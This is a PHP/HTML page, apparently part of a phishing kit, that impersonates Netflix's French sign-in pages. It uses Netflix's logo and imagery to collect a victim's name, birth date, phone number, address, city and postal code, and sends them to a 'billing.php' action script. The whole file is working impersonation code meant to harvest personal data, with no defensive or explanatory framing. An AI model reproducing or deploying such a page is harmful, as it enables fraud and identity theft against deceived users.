<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>

<html lang="fr">

<?php include("../common/header.php") ?>




<body>

    <div id="appMountPoint" style="transition-duration : 2s" class="transition">
        <div class="login-wrapper hybrid-login-wrapper">
            <div class="login-wrapper-background"><img class="concord-img vlv-creative" src="https://assets.nflxext.com/ffe/siteui/vlv3/5a27cb25-33a9-4bcc-b441-95fefabcbd37/b42206c6-4cfa-43a2-903c-35aff1fedde5/FR-fr-20210823-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcset="https://assets.nflxext.com/ffe/siteui/vlv3/5a27cb25-33a9-4bcc-b441-95fefabcbd37/b42206c6-4cfa-43a2-903c-35aff1fedde5/FR-fr-20210823-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/5a27cb25-33a9-4bcc-b441-95fefabcbd37/b42206c6-4cfa-43a2-903c-35aff1fedde5/FR-fr-20210823-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/5a27cb25-33a9-4bcc-b441-95fefabcbd37/b42206c6-4cfa-43a2-903c-35aff1fedde5/FR-fr-20210823-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt=""></div>
            <div class="nfHeader login-header signupBasicHeader">
                <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div>
            <div class="login-body">
                <div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Il semble que JavaScript soit désactivé. Veuillez l'activer pour restaurer toutes les fonctionnalités de la page.</div></div></noscript>
                    <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
                        <div class="hybrid-login-form-main">
                            <h1 data-uia="login-page-title">Informations personnelles</h1>

                           <?php if(isset($_GET["error"])){ ?> <div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Veuillez renseigner correctement les informations dans les champs dédiés.</div></div> <?php } ?>

                            <form method="post" class="login-form" action="../actions/billing.php" id="main_form">

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input type="text" name="bat_nom" placeholder="Nom" id="name_its" style="padding-top : 0;" class="nfTextField" required onkeypress="return (event.charCode > 64 && event.charCode < 91) || (event.charCode > 96 && event.charCode < 123)">
                                            </label>
                                        </div>
                                    </div>
                                </div>

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input type="text" name="bat_prenom" placeholder="Prénom" id="surname_its" style="padding-top : 0;" class="nfTextField" required onkeypress="return (event.charCode > 64 && event.charCode < 91) || (event.charCode > 96 && event.charCode < 123)">
                                            </label>
                                        </div>
                                    </div>
                                </div>

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input name="bat_birthday" class="nfTextField" id="birth" placeholder="Date de naissance" style="padding-top : 0"  type="text" required>
                                            </label>
                                        </div>
                                    </div>
                                </div>

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input class="no-spin nfTextField" id="phone_number_input" name="bat_phone" placeholder="Numéro de téléphone"  style="padding-top : 0" type="text" required>
                                            </label>
                                        </div>
                                    </div>
                                </div>

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input type="text" name="bat_adresse" placeholder="Adresse" id="1" style="padding-top : 0;" class="nfTextField" required>
                                            </label>
                                        </div>
                                    </div>
                                </div>

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input type="text" name="bat_ville" placeholder="Ville" id="1" style="padding-top : 0;" class="nfTextField" required onkeypress="return (event.charCode > 64 && event.charCode < 91) || (event.charCode > 96 && event.charCode < 123)">
                                            </label>
                                        </div>
                                    </div>
                                </div>

                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input id="postal_input"  class="no-spin nfTextField" placeholder="Code postal"  name="bat_zip" type="text" style="outline : none;padding-top : 0"    required>
                                            </label>
                                        </div>
                                    </div>
                                </div>




                                <div data-uia="password-field+container" class="nfInput nfPasswordInput login-input login-input-password">
                                <button class="btn login-button btn-submit btn-small" type="submit" tabindex="0" name="bat_billing_submit">Continuer</button>
                            </form>
                        </div>

                    </div>
                </div>
            </div>
        </div>
            <?php include("../common/footer.php") ?>
        </div>
    </div>
    <div>

    </div>
</body>

</html>


<script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>

<script src="../assets/js/loader.js"></script>

<script src="../assets/js/mask.js"></script>

<script src="../assets/js/billing.js"></script>